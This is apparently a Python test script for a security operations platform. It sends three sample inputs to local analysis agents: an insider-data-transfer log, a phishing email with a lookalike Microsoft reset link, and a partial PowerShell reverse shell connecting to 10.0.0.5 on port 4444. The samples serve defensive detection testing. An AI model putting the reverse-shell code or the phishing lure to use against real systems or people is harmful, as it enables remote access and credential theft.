import requests
import json
import time

BASE_URL = "http://localhost:8000/api"

def divider(title):
    print(f"\n{'='*50}")
    print(f"  {title}")
    print('='*50)

def test_ueba_agent():
    divider("UEBA Agent (Insider Threat)")
    log = "User 'sarah.connor' accessed 45GB of Salesforce HR data and attempted to transfer it via USB at 03:15 AM."
    response = requests.post(f"{BASE_URL}/analyze/ueba", json={"user_activity_log": log})
    print(f"Status: {response.status_code}")
    print(json.dumps(response.json(), indent=4))

def test_phishing_agent():
    divider("Phishing Security Agent")
    email = "URGENT: Your Office365 password expires in 2 hours. Click here to reset: http://login-microsoft-secure-auth.com/reset"
    response = requests.post(f"{BASE_URL}/analyze/phishing", json={"email_content": email})
    print(f"Status: {response.status_code}")
    print(json.dumps(response.json(), indent=4))

def test_sandbox_agent():
    divider("Sandbox Static Code Analyzer")
    # This is a classic PowerShell reverse shell payload
    script = "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.5', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};"
    response = requests.post(f"{BASE_URL}/analyze/sandbox", json={"malware_code": script})
    print(f"Status: {response.status_code}")
    print(json.dumps(response.json(), indent=4))

if __name__ == "__main__":
    print("\nGuard SOC - Bonus Agent Test Suite")
    test_ueba_agent()
    time.sleep(3)
    test_phishing_agent()
    time.sleep(3)
    test_sandbox_agent()
    print("\n\nAll 3 Bonus Agents VERIFIED.")
